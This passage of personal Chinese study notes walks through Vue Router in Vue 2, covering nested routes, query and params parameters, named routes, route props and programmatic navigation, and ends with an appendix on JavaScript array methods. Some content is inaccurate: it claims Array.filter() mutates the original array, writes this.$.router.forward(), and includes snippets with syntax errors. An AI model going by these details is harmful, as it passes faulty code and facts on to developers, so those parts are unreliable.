  <div class="col-xs-offset-2 col-xs-8">
    <div class="page-header"><h2>Vue Router Demo</h2></div>
  </div>
</template>
<script>
export default {
  name: "Banner",
};
</script>
```

```vue
//App.vue
<template>
  <div>
    <div class="row">
     <Banner/>
    </div>
    <div class="row">
      <div class="col-xs-2 col-xs-offset-2">
        <div class="list-group">
          <!-- 原始html中我们使用 a 标签实现页面跳转-->
          <!-- <a class="list-group-item active" href="./about.html">About</a> -->
          <!-- <a class="list-group-item" href="./home.html">Home</a> -->
          <!-- Vue中借助 router-link 标签实现路由的切换-->
          <router-link class="list-group-item " active-class="active" to="/about">About</router-link> 
          <router-link class="list-group-item" active-class="active" to="/home">Home</router-link>
        </div>
      </div>
      <div class="col-xs-6">
        <div class="panel">
          <div class="panel-body">
            <!-- 指定路由组件的呈现位置 -->
            <router-view></router-view>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>
<script>
import Banner from './components/Banner.vue'
export default {
  name: "App",
  components: {
    Banner
  }
};
</script> 
```

```js
// /router/index.js
// 该文件用于创建整个应用的路由器
import VueRouter from 'vue-router'
import About from '../pages/About'
import Home from '../pages/Home'
// 创建并暴露一个路由器,用于管理一组一组的路由规则
export default new VueRouter({
    routes:[
        {
            path:"/about",
            component:About
        },
        {
            path:'/home',
            component:Home,
        }
    ]
})
```

```js
//main.js
// 引入 Vue 
import Vue from "vue";
// 引入 App
import App from "./App.vue"
// 引入VueRouter
import VueRouter  from 'vue-router'
// 引入路由器
import router from './router/index'
// 阻止Vue生产提示
Vue.config.productionTip = false;
// 应用路由插件
Vue.use(VueRouter)
new Vue({
  el:'#app',
  // 完成的功能：将 App 组件放入容器中
  render(h) {
    return h(App)
  },
  // 注册路由器
  router: router
})
```

![image-20231004141107144](D:\typora_photo\image-20231004141107144.png)

![image-20231004151758988](D:\typora_photo\image-20231004151758988.png)

#### 6.3.2  几个注意事项

1. **路由组件通常存放在`pages`文件夹，一般组件通常存放`components`文件夹**
2. 通过切换，“隐藏”了路由组件，**默认**是被**销毁**掉的，需要的时候再重新去**挂载**。
3. 每个组件都有自己的**`$route`属性，里面存储着自己的路由信息**
4. **整个应用只有一个`router`**，可以通过组件的`$router`属性获取到

![image-20231004154946551](D:\typora_photo\image-20231004154946551.png)

**路由是怎么被用的呢？当你点击了路由链接，修改了路径，前端路由器监测到了，匹配规则的时候（也就是在路由表中找到）发现这个路径得对应某个组件，于是就把对应的这个组件渲染到页面上了。**

### 6.4 嵌套（多级）路由

1.配置路由规则，使用children配置项:

```js
routes:[
    {
       path:'/about',
       component:About 
    },
    {
        path:'/home', 
        component:Home,
        children:[//通过children配置子级路由
               {
               path:'news'，//此处一定不要写:/news 
               component:News
               },
            {
              path:'message' ,//此处一定不要写:/message 
              component:Message
            }
           ]
    }
   }

2.跳转(要写完整路径):
<router-link to="/home/news">News</router-link>
```

示例：

![image-20231005160026222](D:\typora_photo\image-20231005160026222.png)

```vue
// /components/Banner.vue
<template>
  <div class="col-xs-offset-2 col-xs-8">
    <div class="page-header"><h2>Vue Router Demo</h2></div>
  </div>
</template>
<script>
export default {
  name: "Banner",
};
</script>
```

```vue
// /pages/About.vue
<template>
  <div>
    <h2>我是about内容</h2>
  </div>
</template>
<script>
export default {
  name: "About",
//  beforeDestroy() {
//   console.log('About组件即将被销毁');
//   },
 mounted() {
   console.log('About组件挂载完毕了', this);
   window.aboutRoute = this.$route
   window.aboutRouter=this.$router
 },
};
</script>
<style scoped>
button {
  margin-left: 5px;
}
</style>
```

```vue
// /pages/Home.vue
<template>
  <div class="panel-body">
    <div>
      <h2>Home组件内容</h2>
      <div>
        <ul class="nav nav-tabs">
          <li>
            <!-- 跳转子集目录，要使用全路径 -->
            <router-link
              class="list-group-item"
              active-class="active"
              to="/home/newlist"
              >News</router-link
            >
          </li>
          <li>
            <router-link
              class="list-group-item"
              active-class="active"
              to="/home/message"
              >Message</router-link
            >
          </li>
        </ul>
      </div>
      <!-- 指定路由组件展示位 -->
      <router-view></router-view>
    </div>
  </div>
</template>
<script>
export default {
  name: "Home",
  //   beforeDestroy() {
  // console.log('Home组件即将被销毁');
  // },
  mounted() {
    console.log("Home组件挂载完毕了", this);
    window.homeRoute = this.$route;
    window.homeRouter = this.$router;
  },
};
</script>
```

```vue
// /pages/Message.vue
<template>
  <div>
    <ul>
      <li><a href="/message1">message001</a>&nbsp;&nbsp;</li>
      <li><a href="/message2">message002</a>&nbsp;&nbsp;</li>
      <li><a href="/message/3">message003</a>&nbsp;&nbsp;</li>
    </ul>
  </div>
</template>
  <script>
export default {
  name: "Message",
};
</script>
```

```vue
// /pages/Newlist.vue
<template>
  <ul>
    <li>news001</li>
    <li>news002</li>
    <li>news003</li>
  </ul>
</template> 
  <script>
export default {
  name: "Newlist",
};
</script>
```

```vue
//App.vue
<template>
  <div>
    <div class="row">
     <Banner/>
    </div>
    <div class="row">
      <div class="col-xs-2 col-xs-offset-2">
        <div class="list-group">
          <!-- 原始html中我们使用 a 标签实现页面跳转-->
          <!-- <a class="list-group-item active" href="./about.html">About</a> -->
          <!-- <a class="list-group-item" href="./home.html">Home</a> -->
          <!-- Vue中借助 router-link 标签实现路由的切换-->
          <router-link class="list-group-item " active-class="active" to="/about">About</router-link> 
          <router-link class="list-group-item" active-class="active" to="/home">Home</router-link>
        </div>
      </div>
      <div class="col-xs-6">
        <div class="panel">
          <div class="panel-body">
            <!-- 指定路由组件的呈现位置 -->
            <router-view></router-view>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>  
<script>
import Banner from './components/Banner.vue'
export default {
  name: "App",
  components: {
    Banner
  }
};
</script>
```

```js
// /router/index.js
// 该文件用于创建整个应用的路由器
import VueRouter from 'vue-router'
import About from '../pages/About'
import Home from '../pages/Home'
import Message from '../pages/Message'
import Newlist from '../pages/Newlist'
// 创建并暴露一个路由器,用于管理一组一组的路由规则
export default new VueRouter({
    routes: [
        {
            path: "/about",
            component: About
        },
        {
            path: '/home',
            component: Home,
            children: [
                {
                    path: 'newlist',
                    component: Newlist
                },
                {
                    path: 'message',
                    component: Message
                }
            ]
        }
    ]
})
```

```js
//main.js
// 引入 Vue 
import Vue from "vue";
// 引入 App
import App from "./App.vue"
// 引入VueRouter
import VueRouter  from 'vue-router'
// 引入路由器
import router from './router/index'
// 阻止Vue生产提示
Vue.config.productionTip = false;
// 应用路由插件
Vue.use(VueRouter)
new Vue({
  el:'#app',
  // 完成的功能：将 App 组件放入容器中
  render(h) {
    return h(App)
  },
  // 注册路由器
  router: router
})
```

![image-20231005160504176](D:\typora_photo\image-20231005160504176.png)

### 6.5 路由的 query 参数

1.传递参数

```vue
<ul>
  <li v-for="m in messagelist" :key="m.id">
   <!-- 跳转路由并携带参数，to的字符串写法（利用数据绑定，字符串里面为所需传入的值） -->
   <router-link :to="`/home/message/detail?id=${m.id}&name=${m.name}`">{{m.name}}</router-link>
  <!-- 跳转路由并携带参数，to的对象写法 -->
   <router-link :to="{
            path:'/home/message/detail',
            query:{
                id:m.id,
                name:m.name
           }   
        }">
       {{ m.name }}</router-link>
  </li>
</ul>
```

2.接收参数

```js
$route.query.id
$route.query.title
```

3.示例：与6.4相似的页面不展示

```vue
//Detail.vue
<template>
  <ul>
    <li>消息id:{{ $route.query.id }}</li>
    <li>消息标题:{{ $route.query.name }}</li>
  </ul>
</template>
<script>
export default {
  name: "Detail",
  mounted() {
    console.log(this.$route);
  },
};
</script>
```

```vue
//Message.vue
<template>
  <div>
    <ul>
      <li v-for="m in messagelist" :key="m.id">
         <!-- 跳转路由并携带参数，to的字符串写法 -->
        <!-- <router-link :to="`/home/message/detail?id=${m.id}&name=${m.name}`">{{m.name}}</router-link>&nbsp;&nbsp;-->
        <!-- 跳转路由并携带参数，to的对象写法 -->
       <router-link :to="{
            path:'/home/message/detail',
            query:{
              id:m.id,
              name:m.name
            }   }">{{ m.name }}</router-link>
      </li>
    </ul>
    <router-view></router-view>
  </div>
</template>
  <script>
export default {
  name: "Message",
  data(){
      return {
        messagelist: [
        { id: '001', name: '消息001' },
        { id: '002', name: '消息002' },
        { id: '003', name: '消息003' }
        ]
      }
  }
};
</script>
```

```js
//index.js
// 该文件用于创建整个应用的路由器
import VueRouter from 'vue-router'

import About from '../pages/About'
import Home from '../pages/Home'
import Message from '../pages/Message'
import Newlist from '../pages/Newlist'
import Detail from '../pages/Detail'
// 创建并暴露一个路由器,用于管理一组一组的路由规则
export default new VueRouter({
    routes: [
        {
            path: "/about",
            component: About
        },
        {
            path: '/home',
            component: Home,
            children: [
                {
                    path: 'newlist',
                    component: Newlist
                },
                {
                    path: 'message',
                    component: Message,
                    children: [
                        {
                            path: 'detail',
                            component: Detail,
                        }
                    ]
                }
            ]
        }
    ]
})
```

![image-20231005165114802](D:\typora_photo\image-20231005165114802.png)

### 6.6 命名路由

1. 作用：可以简化路由的跳转
2. 使用方式：

1. a.给路由命名

2. ```js 
   {
   	path:'/demo',
   	component:Demo,
   	children:[
   		{
   			path:'test',
   			component:Test,
   			children:[
   				{
                       name:'hello' // 给路由命名 跳转页面时 :to="{name = "hello"}"
   					path:'welcome',
   					component:Hello,
   				}
   			]
   		}
   	]
   }
   ```

3. b.简化跳转

4. ```js
   <!--简化前，需要写完整的路径 -->
   <router-link to="/demo/test/welcome">跳转</router-link>
   
   <!--简化后，直接通过名字跳转 -->
   <router-link :to="{name:'hello'}">跳转</router-link>
   
   <!--简化写法配合传递参数 -->
   <router-link 
   	:to="{
   		name:'hello',
   		query:{
   		    id:666,
           title:'你好'
   		}
   	}">跳转</router-link>
   ```

5. 示例代码参考27-src_路由的query参数+命名空间



![image-20231005171901530](D:\typora_photo\image-20231005171901530.png)

### **6.7  路由的params参数**

1. 配置路由，声明接收params参数

   ```js
   {
     path:'/home',
       component:Home,
         // 子级目录
         children:[
           {
             path:'news',
             component:News
           },
           {
             // 注意子级目录不需要加 / !!!!!
             path:'message',
             component:Message,
             children:[
               {
                 // 命名路由，可以直接 :to="{name = "xiangqing"}"
                 name:'xiangqing',
                 // 使用 Params 参数时，使用占位声明接收 params 参数
                 path:'detail/:id/:title',
                 component:Deatil
               }
             ]
           },
         ]
   },
   ```

   2.传递参数
   注意：**路由携带params参数时，若使用to的对象写法，则不能使用path配置项，必须使用name配置**

```js
<!-- 跳转并携带params参数，to的字符串写法 -->
<router-link :to="/home/message/detail/666/你好">跳转</router-link>
<router-link :to="`/home/message/detail/${m.id}/${m.name}`">{{m.name}}</router-link>		
<!-- 跳转并携带params参数，to的对象写法 -->
<router-link 
	:to="{
		name:'xiangqing',
		params:{
		   id:666,
       title:'你好'
		}
	}"
>跳转</router-link>
```

3.接收参数

```js
$route.params.id
$route.params.title
```

示例：与6.4相同代码不展示

```vue
//Message.vue
<template>
  <div>
    <ul>
      <li v-for="m in messagelist" :key="m.id">
         <!-- 跳转路由并携带参数，to的字符串写法 -->
       <!-- <router-link :to="`/home/message/detail/${m.id}/${m.name}`">{{m.name}}</router-link>&nbsp;&nbsp; -->
        <!-- 跳转路由并携带参数，to的对象写法 -->
       <router-link :to="{
            name:'xiangqing',
            params:{
              id:m.id,
              name:m.name
            }   }">{{ m.name }}</router-link>
      </li>
    </ul>
    <router-view></router-view>
  </div>
</template>
  <script>
export default {
  name: "Message",
  data(){
      return {
        messagelist: [
        { id: '001', name: '消息001' },
        { id: '002', name: '消息002' },
        { id: '003', name: '消息003' }
        ]
      }
  }
};
</script>
```

```vue
//Detail.vue
<template>
  <ul>
    <li>消息id:{{ $route.params.id }}</li>
    <li>消息标题:{{ $route.params.name }}</li>
  </ul>
</template>
<script>
export default {
  name: "Detail",
  mounted() {
    console.log(this.$route);
  },
};
</script>
```

```js
//index.js
// 该文件用于创建整个应用的路由器
import VueRouter from 'vue-router'
import About from '../pages/About'
import Home from '../pages/Home'
import Message from '../pages/Message'
import Newlist from '../pages/Newlist'
import Detail from '../pages/Detail'
// 创建并暴露一个路由器,用于管理一组一组的路由规则
export default new VueRouter({
    routes: [
        {
            name:'guanyu',
            path: "/about",
            component: About
        },
        {
            path: '/home',
            component: Home,
            children: [
                {
                    path: 'newlist',
                    component: Newlist
                },
                {
                    path: 'message',
                    component: Message,
                    children: [
                        {
                            name:'xiangqing',
                            path: 'detail/:id/:name',
                            component: Detail,
                        }
                    ]
                }
            ]
        }
    ]
})
```

### 6.8 路由的props配置 

作用：让路由组件更方便的收到参数

```js
{
  // 命名路由，可以直接 :to="{name = "xiangqing"}"
  name:'xiangqing',
    // 使用 Params 参数时，使用占位声明接收 params 参数
    path:'detail',
      component:Deatil，
        // props 的第一种写法，值为对象，该对象中的所有key-value 都会一props的形式传给Detatil组件
        // props:{a:1,b:'Hello'}

        // props的第二种写法，值为布尔值，若布尔值为真，就会把该路由组件收到的所有 params参数，以props的  形式传给Detail组件
        // props:true

        // props的第三种写法，值为函数，可以调用 query,params
        props($route){
        return {
          id : $route.query.id,
          title:$route.query.title
        }
      }
    //解构赋值写法
    props({query}) {//解构赋值
         return {id:query.id,name:query.name}
    }
    props({query:{id,name}}) {//深层解构赋值
        return {id,name}
    }     
}
```

示例：与6.4相似代码不展示

```js
//index.js
// 该文件用于创建整个应用的路由器
import VueRouter from 'vue-router'
import About from '../pages/About'
import Home from '../pages/Home'
import Message from '../pages/Message'
import Newlist from '../pages/Newlist'
import Detail from '../pages/Detail'
// 创建并暴露一个路由器,用于管理一组一组的路由规则
export default new VueRouter({
    routes: [
        {
            name:'guanyu',
            path: "/about",
            component: About
        },
        {
            path: '/home',
            component: Home,
            children: [
                {
                    path: 'newlist',
                    component: Newlist
                },
                {
                    path: 'message',
                    component: Message,
                    children: [
                        {
                            name:'xiangqing',
                            path: 'detail/:id/:name',
                            component: Detail,
               //props的第一种写法，值为对象，该对象中的所有key-value都会以props的形式传给detail组件
                            // props: {
                            //     a: 1,
                            //     b:'hello'
             //props的第二种写法，值为布尔值，若值为真，就会把该路由组件收到的所有params参数
             //以props的形式传给Detail组件
                            // props:true
              //props的第三种写法，值为函数(query与params都适合)
                            props($route) {
                                return {id:$route.params.id,name:$route.params.name}
                            }
                            // props({params}) {//解构赋值
                            //     return {id:params.id,name:params.name}
                            // }
                            // props({params:{id,name}}) {//深层解构赋值
                            //     return {id,name}
                            // }
                        }
                    ]
                }
            ]
        }
    ]
})
```

```vue
//Detail.vue
<template>
  <ul>
    <li>消息id:{{ id }}</li>
    <li>消息标题:{{ name }}</li>
  </ul>
</template>
<script>
export default {
  name: "Detail",
  props:['id','name'],
  mounted() {
    console.log(this.$route);
  },
  // computed: {
  //   id() {
  //     return this.$route.params.id
  //   },
  //   name() {
  //     return this.$route.params.name
  //   }
  // }
};
</script>
```

![image-20231005195734410](D:\typora_photo\image-20231005195734410.png)

### 6.9  router-link> 的 replace 属性

网页历史记录的操作模式：push模式/栈操作

1. **作用**：控制路由跳转时操作浏览器历史记录的模式
2. 浏览器的历史记录有两种写入方式：分别为`push`和`replace`

1. 1. push：追加历史记录，路由**默认**跳转方式
   2. replace：**替换当前记录**

1. 如何开启replace模式：
               <router-link  :replace="true"..>News</router-link>
   简写：<router-link   replace ...>News</router-link>
2. 总结：**浏览记录本质是一个栈，默认push**，点开新页面就会在栈顶追加一个地址，后退，栈顶指针向下移动，改为replace就是不追加，而将栈顶地址直接替换

```vue
//App.vue
<div class="list-group">
       <router-link  replace class="list-group-item " active-class="active"            to="/about">About</router-link> 
       <router-link replace class="list-group-item" active-class="active" to="/home">Home</router-link>
</div>
```

### 6.10 **编程式路由导航**

1. **作用**：不借助`<router-link>`实现路由跳转，让路由跳转更加灵活
2. API：

1. 1. `this.$router.push()`**：**追加
   2. `this.$router.replace()`：替换
   3. `this.$.router.forward()` ：前进
   4. `this.$.router.back()` ：后退
   5. `this.$.router.go(number)` ： 正数前进负数后退

![image-20231005203548451](D:\typora_photo\image-20231005203548451.png)

6.11 缓存路由组件









## 附录

#### 1.vue中的undefined

vue对于结果是undefined的值是不报错的，页面不显示而已，获取对象身上不存在的属性就会返回undefined，但是不会报错。

#### 2.数组的常用方法

```js
Array.push()，向数组的末尾添加一个或多个元素，并返回新的数组长度。原数组改变。
Array.pop()，删除并返回数组的最后一个元素，若该数组为空，则返回undefined。原数组改变。
Array.unshift()，向数组的开头添加一个或多个元素，并返回新的数组长度。原数组改变。
Array.shift()，删除数组的第一项，并返回第一个元素的值。若该数组为空，则返回undefined。原数组改变。
Array.reverse()，将数组倒序。原数组改变。
Array.sort()，对数组元素进行排序。按照字符串UniCode码排序，原数组改变。
Array.filter()过滤，原数组改变
Array.concat(arr1,arr2…)，合并两个或多个数组，生成一个新的数组。原数组不变。
Array.join()，将数组的每一项用指定字符连接形成一个字符串。默认连接字符为 “,” 逗号
Array.map(function)，原数组的每一项执行函数后，返回一个新的数组。原数组不变。
Array.slice() 按照条件查找出其中的部分内容
array.slice(n, m)，从索引n开始查找到m处（不包含m）
array.slice(n) 第二个参数省略，则一直查找到末尾
array.slice(0)原样输出内容，可以实现数组克隆
array.slice(-n,-m) slice支持负参数，从最后一项开始算起，-1为最后一项，-2为倒数第二项
Array.splice(index,howmany,arr1,arr2…) ，用于添加或删除数组中的元素。从index位置开始删除howmany个元素，并将arr1、arr2…数据从index位置依次插入。howmany为0时，则不删除元素,原数组改变。
Array.reduce(function)接收一个函数作为累加器，数组中的每个值（从左到右）开始缩减，最终计算为一个值。
array.indexOf(item,start) 检测当前值在数组中第一次出现的位置索引,返回值：第一次查到的索引，未找到返回-1。
includes()判断一个数组是否包含一个指定的值参数：指定的内容,返回值：布尔值,是否改变原数组：不改变。
```

示例：

```js
//替换索引位置为 2 的元素的值为 'aaa'
var a = [1, 2, 3, 4, 5]
a.splice(2, 1, 'aaa')
console.log(a) // [1, 2, 'aaa', 4, 5]
var a = [1, 2, 3, 4, 5] 
a.splice(-5)*
console.log(a) // []
```

#### 3.表单完善

![image-20230920231120932](D:\typora_photo\image-20230920231120932.png)

#### 4.js中的comfirm方法

confirm() 方法用于显示一个带有指定消息和 OK 及取消按钮的对话框。

如果用户点击确定按钮，则 confirm() 返回 true。如果点击取消按钮，则 confirm() 返回 false

#### 5.js中的reduce方法

**`reduce()`** 方法对数组中的每个元素按序执行一个提供的 **reducer** 函数，每一次运行 **reducer** 会将先前元素的计算结果作为参数传入，最后将其结果汇总为单个返回值。

```js
语法：
reduce(callbackFn)
reduce(callbackFn, initialValue)

const array1 = [1, 2, 3, 4];
// 0 + 1 + 2 + 3 + 4
const initialValue = 0;
const sumWithInitial = array1.reduce((accumulator, currentValue) => accumulator + currentValue, initialValue);
console.log(sumWithInitial);
// Expected output: 10
```

reducer 逐个遍历数组元素，每一步都将当前元素的值与前一步的结果相加（该结果是之前所有步骤结果的总和）——直到没有更多需要相加的元素。

callbackFn

为数组中每个元素执行的函数。其返回值将作为下一次调用 `callbackFn` 时的 `accumulator` 参数。对于最后一次调用，返回值将作为 `reduce()` 的返回值，其传入一下参数：

​       accumulator:

​     上一次调用 `callbackFn` 的结果。在第一次调用时，如果指定了 `initialValue` 则为指定的值，否则为 `array[0]` 的值。

​      currentValue:

当前元素的值。在第一次调用时，如果指定了 `initialValue`，则为 `array[0]` 的值，否则为 `array[1]`。

#### 6.同源策略

如果两个URL的协议、域名、端口号都相同，就称这两个URL同源

#### 7.发送AJAX请求的方
